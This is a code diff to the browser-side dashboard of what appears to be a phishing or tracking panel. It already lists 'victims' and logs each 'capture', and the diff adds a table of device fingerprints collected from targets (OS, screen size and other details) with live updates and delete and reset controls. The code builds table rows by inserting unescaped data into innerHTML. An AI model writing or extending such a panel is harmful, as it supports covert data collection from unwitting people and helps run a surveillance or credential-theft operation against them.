@@ -55,6 +55,13 @@ function loadData() {
   fetch('/api/victims').then(r => r.json()).then(data => {
     renderTable(data); updateStats(data); updateChart(data);
   });
+  loadFingerprints();
+}
+
+function loadFingerprints() {
+  fetch('/api/fingerprints').then(r => r.json()).then(data => {
+    renderFingerprints(data);
+  });
 }
 
 function updateStats(data) {
@@ -96,8 +103,33 @@ function renderTable(data) {
   `).join('');
 }
 
+function renderFingerprints(data) {
+  const tbody = document.getElementById('fingerprints-body');
+  if (!data.length) { tbody.innerHTML = '<tr><td colspan="9" style="text-align:center; padding: 5rem; color: var(--dim)">AWAITING DEVICE DATA...</td></tr>'; return; }
+  tbody.innerHTML = data.map((v, i) => `
+    <tr>
+      <td style="color:var(--dim)">#${v[0]}</td>
+      <td style="font-weight:700">${v[1]}</td>
+      <td style="font-size:0.85rem">${v[2]}</td>
+      <td style="font-family:'JetBrains Mono'; font-size:0.85rem">${v[3]}x${v[4]}</td>
+      <td style="color:var(--accent)">${v[5]}</td>
+      <td style="color:var(--accent2)">${v[6]}</td>
+      <td style="font-family:'JetBrains Mono'; font-size:0.85rem">${v[8]}</td>
+      <td style="color:var(--dim); font-size:0.8rem">${v[7]}</td>
+      <td>
+        <button class="btn btn-danger" onclick="deleteFingerprint(${v[0]})" style="padding: 0.3rem 0.6rem; font-size: 0.75rem;">DELETE</button>
+      </td>
+    </tr>
+  `).join('');
+}
+
 socket.on('new_victim', () => { addLog(`New capture detected!`, "success"); loadData(); });
+socket.on('new_fingerprint', (data) => { 
+  addLog(`New device fingerprint detected: ${data.os} - ${data.screen_width}x${data.screen_height}`, "success"); 
+  loadFingerprints(); 
+});
 loadData(); setInterval(loadData, 5000);
+setInterval(loadFingerprints, 5000);
 
 function deleteVictim(id) {
   if (!confirm('Are you sure you want to delete this record?')) return;
@@ -142,6 +174,51 @@ function resetIds() {
       }
     })
     .catch(err => addLog(`Error resetting IDs: ${err}`, 'error'));
+}
+
+function deleteFingerprint(id) {
+  if (!confirm('Are you sure you want to delete this fingerprint?')) return;
+  fetch(`/api/delete_fingerprint/${id}`, { method: 'POST' })
+    .then(r => r.json())
+    .then(data => {
+      if (data.status === 'success') {
+        addLog(`Fingerprint #${id} deleted successfully`, 'success');
+        loadFingerprints();
+      } else {
+        addLog(`Failed to delete fingerprint: ${data.message}`, 'error');
+      }
+    })
+    .catch(err => addLog(`Error deleting fingerprint: ${err}`, 'error'));
+}
+
+function deleteAllFingerprints() {
+  if (!confirm('Are you sure you want to delete ALL fingerprints? This action cannot be undone!')) return;
+  fetch('/api/delete_all_fingerprints', { method: 'POST' })
+    .then(r => r.json())
+    .then(data => {
+      if (data.status === 'success') {
+        addLog(`All fingerprints deleted successfully`, 'success');
+        loadFingerprints();
+      } else {
+        addLog(`Failed to delete all fingerprints: ${data.message}`, 'error');
+      }
+    })
+    .catch(err => addLog(`Error deleting all fingerprints: ${err}`, 'error'));
+}
+
+function resetFingerprintIds() {
+  if (!confirm('Are you sure you want to reset fingerprint IDs to start from 1?')) return;
+  fetch('/api/reset_fingerprint_ids', { method: 'POST' })
+    .then(r => r.json())
+    .then(data => {
+      if (data.status === 'success') {
+        addLog(`Fingerprint IDs reset successfully`, 'success');
+        loadFingerprints();
+      } else {
+        addLog(`Failed to reset fingerprint IDs: ${data.message}`, 'error');
+      }
+    })
+    .catch(err => addLog(`Error resetting fingerprint IDs: ${err}`, 'error'));
 }
 
 // Sidebar export menu toggle and positioning
